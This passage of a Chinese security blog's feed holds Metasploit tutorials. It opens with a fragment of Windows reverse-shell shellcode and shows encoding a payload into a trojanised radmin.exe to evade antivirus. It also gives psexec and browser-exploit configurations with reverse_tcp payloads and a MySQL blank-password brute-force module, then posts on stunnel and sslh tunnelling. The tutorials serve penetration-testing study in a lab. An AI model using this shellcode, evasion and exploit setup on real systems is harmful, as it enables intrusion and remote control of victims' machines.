class="string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span> +</span><br><span class="line"><span class="string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span> +</span><br><span class="line"><span class="string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span> +</span><br><span class="line"><span class="string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span> +</span><br><span class="line"><span class="string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span> +</span><br><span class="line"><span class="string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span> +</span><br><span class="line"><span class="string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span> +</span><br><span class="line"><span class="string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span> +</span><br><span class="line"><span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"</span> +</span><br><span class="line"><span class="string">"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"</span> +</span><br><span class="line"><span class="string">"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"</span> +</span><br><span class="line"><span class="string">"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"</span> +</span><br><span class="line"><span class="string">"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"</span> +</span><br><span class="line"><span class="string">"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"</span> +</span><br><span class="line"><span class="string">"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"</span> +</span><br><span class="line"><span class="string">"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"</span> +</span><br><span class="line"><span class="string">"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"</span> +</span><br><span class="line"><span class="string">"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"</span> +</span><br><span class="line"><span class="string">"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"</span> +</span><br><span class="line"><span class="string">"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"</span> +</span><br><span class="line"><span class="string">"\x6f\x6a\x00\x53\xff\xd5"</span></span><br></pre></td></tr></table></figure></li><li><p>MSF自动选择编码模块绕过坏字符</p></li></ul><pre><code>generate -b &apos;\x00&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&apos;</code></pre><p><strong>直接使用payload</strong></p><ul><li>手动指定编码模块</li></ul><pre><code>show encoders        #显示可用编码模块generate -e x86/nonalpha    #-e参数指定编码模块generate -b &apos;\x00&apos; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exenc targetIP 4444</code></pre><p><strong>NOP</strong>: no-operation / Next Operation (无任何操作)</p><ul><li>EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行</li></ul><pre><code>generate -s 14</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;生成payload&quot;&gt;&lt;a href=&quot;#生成payload&quot; class=&quot;headerlink&quot; title=&quot;生成payload&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfconsole
use pa
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="ruby" scheme="http://c.cat.plus/tags/ruby/"/>
    
      <category term="shellcode" scheme="http://c.cat.plus/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>MSF之Exploit模块</title>
    <link href="http://c.cat.plus/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
    <id>http://c.cat.plus/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</id>
    <published>2016-03-04T10:13:53.000Z</published>
    <updated>2020-06-16T07:48:17.594Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a><strong>Exploit模块</strong></h4><p><strong>Active Exploit</strong>    主动利用</p><pre><code>#smb漏洞,直接利用达到控制目标,类似永恒之蓝use exploit/windows/smb/psexec            set rhost 192.168.254.113set payload windows/shell/reverse_tcpset lhost 192.168.254.118set lport 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><p><strong>Passive Exploits</strong>    被动利用</p><pre><code>#针对早期IE6,IE7浏览器漏洞,诱使目标访问URL即可控制目标use exploit/windows/browser/ms07_017_ani_loadimage_chunksize    set URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.254.111set LPORT 4444exploit</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Exploit模块&quot;&gt;&lt;a href=&quot;#Exploit模块&quot; class=&quot;headerlink&quot; title=&quot;Exploit模块&quot;&gt;&lt;/a&gt;&lt;strong&gt;Exploit模块&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Active Exploit&lt;/s
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="exploit" scheme="http://c.cat.plus/tags/exploit/"/>
    
      <category term="ms07_017" scheme="http://c.cat.plus/tags/ms07-017/"/>
    
  </entry>
  
  <entry>
    <title>MSF基本使用和控制台命令</title>
    <link href="http://c.cat.plus/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
    <id>http://c.cat.plus/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</id>
    <published>2016-03-03T21:03:33.000Z</published>
    <updated>2020-06-13T11:50:04.168Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h4 id="MSF基本使用"><a href="#MSF基本使用" class="headerlink" title="MSF基本使用"></a>MSF基本使用</h4></blockquote><ul><li><p>使用前先升级: <code>msfupdate</code></p></li><li><p>msfcli 使用接口</p></li><li><p>msfconsole 使用接口<br>  最流行的用户接口<br>  几乎可以使用全部的MSF功能<br>  控制台命令支持TAB自动补齐<br>  支持外部命令的执行(系统命令等)<br>  点击鼠标启动 <code>/ msfconsole -h -q -r -v / exit</code><br>  <code>help / ? / workspace</code></p></li><li><p><code>banner , color , connect -h</code>        </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">connect 1.1.1.1 80#connect类似nc</span><br></pre></td></tr></table></figure><h4 id="msfconsole-控制台命令"><a href="#msfconsole-控制台命令" class="headerlink" title="msfconsole 控制台命令"></a>msfconsole 控制台命令</h4><p><strong>show</strong>    #使用频率高</p><pre><code>show all            #显示所有模块show exploits        #显示可利用模块show payloads        #显示可用payload模块show auxiliary        #显示可用辅助模块    show options        #显示选项show encoders        #显示可用编码模块show nops            #显示nops模块show plugins        #显示可用插件</code></pre><p><strong>search</strong>        搜索命令</p><pre><code>search -hsearch ms10-046            #根据关键字搜索search ms08-067search usermap_scriptsearch name:mysql        #搜索名称包含search platform:aix        #根据平台搜索search type:aux            #根据类型搜索search author:aaron        #根据作者名搜索search cve:2011            #根据cve时间搜索                        #可多条件同时搜索</code></pre><p><strong>use</strong>    使用</p><pre><code>use exploit/windows/smb/ms08_067_netapi            #search找到目标模块后use它use auxiliary/dos/windows/smb/ms09_001_write    info            #查看当前模块信息    info edit        #编辑模块信息    show options    #显示当前模块配置选项    show targets    #显示当前模块适用攻击目标    show payload    #显示当前模块适用的payload    show advanced    #显示当前模块高级参数    show missing    #显示当前模块未配置参数    show evasion    #逃避    set rhost 1.1.1.1    #设置当前模块目标IP    chack                #检查配置    back                #返回上一级命令</code></pre><p><strong>msf数据库相关命令</strong></p><pre><code>db_status            #查看数据库状态db_rebuild_cache    #创建数据库缓存,MSF5不推荐使用此命令db_disconnect        #断开数据连接db_connect -h        #连接其它数据库    /usr/share/metasploit-framework/config/database.yml    #指定数据库连接配置文件进行连接db_nmap 1.1.1.1                    #使用nmap扫描并将扫描结果储存到msf数据库    hosts                        #扫描后,hosts查看所有目标机器信息    hosts 192.168.254.254        #指定目标IP查看    hosts -u                    #只看up开机状态的机器    hosts -c address,os_name    #筛选只看IP和系统类型    hosts -S windows            #搜索指定信息查看    services -h                    #和hosts命令类似    services -p 80                #只看开放80端口的机器    services -p 1-200            #指定端口范围查看    services -c port,info,name     #筛选信息查看db_import                        #导入数据    #结合nmap扫描并输出结果为xml    nmap -A 192.168.254.113 -oX namp.xml        db_import /root/nmap.xml    #导入nmap扫描结果db_export -h                        db_export -f xml /root/bak.xml    #导出备份数据</code></pre><p><strong>set</strong> 设置</p><pre><code>set        #设置unset    #取消设置setg    #全局变量设置unsetg    #取消全局变量设置save    #保存配置,下次启动MSF不用重新设置</code></pre><p><strong>执行</strong></p><pre><code>runexploitexploit -j    #后台执行jobs            #查看已执行的任务sessions -l        #查看已建立连接的会话sessions -i 1    #进入已建立连接的会话load            #加载插件load openvas    #加载openvasunload            #取消加载的插件loadpath        #加载路径自定义插件route            #通过指定sessions路由流量route add 10.1.1.0 255.255.255.0 1irb                #开发接口    Framework::Version    puts &apos;hello world&apos;resource r.rc        #调用资源文件msfconsol -r r.rc    #调用资源文件</code></pre><p><strong>msf爆破mysql空密码测试</strong></p><pre><code>msfconsolesearch mysql_loginuse auxiliary/scanner/mysql/mysql_loginshow optionsset USERNAME rootset BLANK_PASSWORDS trueset rhost 192.168.254.113exploit -jcreds        #查看扫描出的密码信息vulns        #查看目标漏洞信息loot        #查看获取的hashdump</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h4 id=&quot;MSF基本使用&quot;&gt;&lt;a href=&quot;#MSF基本使用&quot; class=&quot;headerlink&quot; title=&quot;MSF基本使用&quot;&gt;&lt;/a&gt;MSF基本使用&lt;/h4&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用前先升级: &lt;code&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Metasploit" scheme="http://c.cat.plus/tags/Metasploit/"/>
    
      <category term="Kali" scheme="http://c.cat.plus/tags/Kali/"/>
    
      <category term="msfconsole" scheme="http://c.cat.plus/tags/msfconsole/"/>
    
  </entry>
  
  <entry>
    <title>MSF架构和技术功能模块</title>
    <link href="http://c.cat.plus/2016/03/04/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/"/>
    <id>http://c.cat.plus/2016/03/04/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/</id>
    <published>2016-03-03T17:53:39.000Z</published>
    <updated>2020-06-13T11:53:41.536Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a><strong>MSF架构</strong></h4><p><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/msf.png" alt="MSF架构"></p><p><strong>Rex</strong></p><ul><li>基本功能库,用于完成日常基本任务,无需人工手动编码实现</li><li>处理socket连接访问,协议应答(http/SSL/SMB等)</li><li>编码转换(XOR,Base64,Unicode)</li></ul><p><strong>MsF::Core</strong></p><ul><li>提供MsF的核心基本API,是框架的核心能力实现库</li></ul><p><strong>MsF::Base</strong></p><ul><li>提供友好的API接口,便于模块调用的库</li></ul><p><strong>Plugin 插件</strong></p><ul><li>连接和调用外部扩展功能和系统</li></ul><h4 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a><strong>MSF目录结构</strong></h4><pre><code>cd /usr/share/metasploit-framework/ &amp;&amp; lsls modules    #模块目录</code></pre><p><strong>技术功能模块</strong>    (不是流程模块)</p><ul><li><p>Exploits: 利用系统漏洞进行攻击的动作,此模块对应每一个具体漏洞的攻击方法(主动,被动)</p></li><li><p>Payload: 成功exploit之后,真正在目标系统执行的代码或指令<br>  shellcode或系统命令<br>  三种payload: <code>cd /usr/share/metasploit-framework/modules/payloads/ &amp;&amp; ls</code></p><p>  Single: all-in-one<br>  Stager: 目标计算机内存有限时,先传输一个较小的payload用于建立连接<br>  Stages: 利用stager建立的连接下载的后续payload<br>  Stager,stages都有多种类型,适用于不同场景<br>  Shellcode 是payload的一种,由于其建立正向/反向shell而得名</p></li><li><p>Auxiliary: 执行信息收集,枚举,指纹探测,扫描等功能的辅助模块(没有payload的exploit模块)</p></li><li><p>Encoders: 对payload进行加密,躲避AV检查的模块</p></li><li><p>Nops: 提高payload稳定性及维持大小</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MSF架构&quot;&gt;&lt;a href=&quot;#MSF架构&quot; class=&quot;headerlink&quot; title=&quot;MSF架构&quot;&gt;&lt;/a&gt;&lt;strong&gt;MSF架构&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://github.com/iseanhe/isea
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="exploit" scheme="http://c.cat.plus/tags/exploit/"/>
    
      <category term="shellcode" scheme="http://c.cat.plus/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit简介及版本</title>
    <link href="http://c.cat.plus/2016/03/03/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/"/>
    <id>http://c.cat.plus/2016/03/03/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/</id>
    <published>2016-03-03T05:21:32.000Z</published>
    <updated>2020-06-13T11:48:17.448Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h4 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a><strong>渗透测试者的困扰</strong></h4></blockquote><ul><li>需要掌握数百个工具软件,上千个命令参数,实在记不住</li><li>新出现的漏洞PoC/EXP有不同的运行环境要求,准备工作繁琐</li><li>大部分时间都在学习不同工具的使用习惯,如果能统一就好了</li><li>Metasploit 能解决以上困扰吗?</li></ul><h4 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a><strong>Metasploit简介</strong></h4><ul><li><p>目前最流行,最强大,最具扩展性的渗透测试平台软件</p></li><li><p>基于Metasploit惊醒渗透测试和漏洞分析的流程和方法</p></li><li><p>2003年由HD Moore发布第一版,2007年用ruby语言重写<br>  框架集成了渗透测试标准(PETS)思想<br>  一定程度上统一了渗透测试和漏洞研究的工作环境<br>  新的攻击代码可以比较容易的加入框架</p></li><li><p>开发活跃版本更新频繁(每周)<br>  早期版本基于社区力量维护,被Rapid 7收购后打造出其商业版产品<br>  目前分化为四个版本,社区版依然十分活跃<br>  HD More说: 为Metasploit写书是种自虐!<br>  2014年之后市场上没有再出现新的Metasploit教材</p></li><li><p>Offensive security 出版的Metasploit教材</p></li><li><p>被HD Moore称之为当时最好的Metasploit教材(2011/2012)</p></li></ul><h4 id="版本对比"><a href="#版本对比" class="headerlink" title="版本对比"></a><strong>版本对比</strong></h4><table><thead><tr><th align="center">Feature</th><th align="center">Metasploit Framework</th><th align="center">Metasploit Community</th><th align="center">Metasploit Express</th><th align="center">Metasploit Pro</th></tr></thead><tbody><tr><td align="center">License</td><td align="center">Free</td><td align="center">Free</td><td align="center">$5,000</td><td align="center">授权</td></tr><tr><td align="center">Web APP测试</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">Report</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">AV免杀</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">操作界面</td><td align="center">Command-line</td><td align="center">Web</td><td align="center">Web</td><td align="center">Web/cmd/adv cmd</td></tr><tr><td align="center">IDS/IPS绕过</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">社区支持</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">Rapid7支持</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">团队协作</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">VPN Pivoting</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr></tbody></table><h4 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a><strong>Metasploit Framework</strong></h4><ul><li>MSF 默认集成于Kali Linux中</li><li>使用postgresql数据库存储数据<br>  早期版本需要先启动数据库再启动msf</li></ul><pre><code>msfdb init        #初始化msf数据库msfdb reinit    #重新初始化msfdb start        #启动msfdb stop        #停止msfdb delete    #删除数据库msfdb status    #查看服务状态msfdb run        #启动数据库并启动msfconsole</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h4 id=&quot;渗透测试者的困扰&quot;&gt;&lt;a href=&quot;#渗透测试者的困扰&quot; class=&quot;headerlink&quot; title=&quot;渗透测试者的困扰&quot;&gt;&lt;/a&gt;&lt;strong&gt;渗透测试者的困扰&lt;/strong&gt;&lt;/h4&gt;&lt;/blockquote&gt;
&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Metasploit" scheme="http://c.cat.plus/tags/Metasploit/"/>
    
      <category term="Kali" scheme="http://c.cat.plus/tags/Kali/"/>
    
      <category term="ruby" scheme="http://c.cat.plus/tags/ruby/"/>
    
      <category term="postgresql" scheme="http://c.cat.plus/tags/postgresql/"/>
    
  </entry>
  
  <entry>
    <title>stunnel4基于SSL加密的隧道工具</title>
    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
    <published>2015-07-11T11:51:03.000Z</published>
    <updated>2020-06-05T07:20:59.006Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a><strong>stunnel4</strong></h3></blockquote><ul><li>无需修改源代码的情况下将TCP流量封装于SSL通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持openssl安全特性</li><li>跨平台</li><li>性能优,多并发</li></ul><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境部署</strong></h4><h5 id="安装内网stunnel4服务器"><a href="#安装内网stunnel4服务器" class="headerlink" title="安装内网stunnel4服务器"></a><strong>安装内网stunnel4服务器</strong></h5><ul><li><p>服务器端配置</p></li><li><p>Linux生成根证书:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new –days 365 -nodes -x509 -out &#x2F;etc&#x2F;stunnel&#x2F; stunnel.pem -keyout &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br></pre></td></tr></table></figure><ul><li>创建配置文件:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</span><br><span class="line">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br><span class="line">setuid &#x3D; stunnel4</span><br><span class="line">setgid &#x3D; stunnel4</span><br><span class="line">pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid</span><br><span class="line">[mysqls]</span><br><span class="line">accept  &#x3D; 0.0.0.0:443</span><br><span class="line">connect &#x3D; 1.1.1.11:3306</span><br></pre></td></tr></table></figure><p><strong>stunnel4自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动stunnel4服务</strong></p><pre><code>service stunnel4 start</code></pre><p><strong>防火墙规则</strong></p><ul><li>端口映射TCP/443端口到stunnel4服务端TCP/443</li><li>设置防火墙规则</li></ul><h5 id="Stunnel4客户端"><a href="#Stunnel4客户端" class="headerlink" title="Stunnel4客户端"></a><strong>Stunnel4客户端</strong></h5><p><strong>安装stunnel4客户端</strong></p><ul><li>kaLi自带</li></ul><p><strong>客户端配置</strong></p><pre><code>创建配置文件    vi /etc/stunnel/stunnel.conf    client = yes    [mysqls]    accept = 3306    connect = 192.168.1.11:443</code></pre><p><strong>客户端自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动客户端服务</strong></p><pre><code>service stunnel4 stop /start</code></pre><p><strong>Mysql客户端连接服务器</strong></p><pre><code>mysql -u root -h 127.0.0.1</code></pre><ul><li>抓包对比隧道前后差异</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;stunnel4&quot;&gt;&lt;a href=&quot;#stunnel4&quot; class=&quot;headerlink&quot; title=&quot;stunnel4&quot;&gt;&lt;/a&gt;&lt;strong&gt;stunnel4&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="stunnel4" scheme="http://c.cat.plus/tags/stunnel4/"/>
    
      <category term="kaLi" scheme="http://c.cat.plus/tags/kaLi/"/>
    
      <category term="openssl" scheme="http://c.cat.plus/tags/openssl/"/>
    
  </entry>
  
  <entry>
    <title>sslh端口转发分配器</title>
    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/"/>
    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/</id>
    <published>2015-07-10T21:51:03.000Z</published>
    <updated>2020-06-05T07:08:46.246Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="sslh"><a href="#sslh" class="headerlink" title="sslh"></a><strong>sslh</strong></h3></blockquote><h4 id="端口分配器"><a href="#端口分配器" class="headerlink" title="端口分配器"></a><strong>端口分配器</strong></h4><ul><li>根据客户端第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP,HTTPS,SSH,OpenVPN,tinc,XMPP和其它可基于正则表达式判断的人和协议类型</li><li>适用于防火墙允许443端口 <strong>入站</strong> 访问流量的环境</li></ul><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h5><pre><code>vi /etc/default/sslh    RUN=yes    DAEMON_OPTS=&quot;--user sslh --listen 1.1.1.10:443 --ssh 127.0.0.1:22 --ssl 1.1.1.11:443 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid&quot;</code></pre><h5 id="安装HTTPS站点"><a href="#安装HTTPS站点" class="headerlink" title="安装HTTPS站点"></a><strong>安装HTTPS站点</strong></h5><ul><li>安装IIS服务,证书服务</li><li>部署HTTPS站点</li></ul><h5 id="启动本地HTTP服务"><a href="#启动本地HTTP服务" class="headerlink" title="启动本地HTTP服务"></a><strong>启动本地HTTP服务</strong></h5><h5 id="防火墙端口映射TCP-443"><a href="#防火墙端口映射TCP-443" class="headerlink" title="防火墙端口映射TCP/443"></a><strong>防火墙端口映射TCP/443</strong></h5><h5 id="nmap扫描服务识别"><a href="#nmap扫描服务识别" class="headerlink" title="nmap扫描服务识别"></a><strong>nmap扫描服务识别</strong></h5><pre><code>nmap -p443 -sV -A 192.168.1.11</code></pre><p><em>扫描结果验证:443端口识别为多个服务</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;sslh&quot;&gt;&lt;a href=&quot;#sslh&quot; class=&quot;headerlink&quot; title=&quot;sslh&quot;&gt;&lt;/a&gt;&lt;strong&gt;sslh&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;端口分配器&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
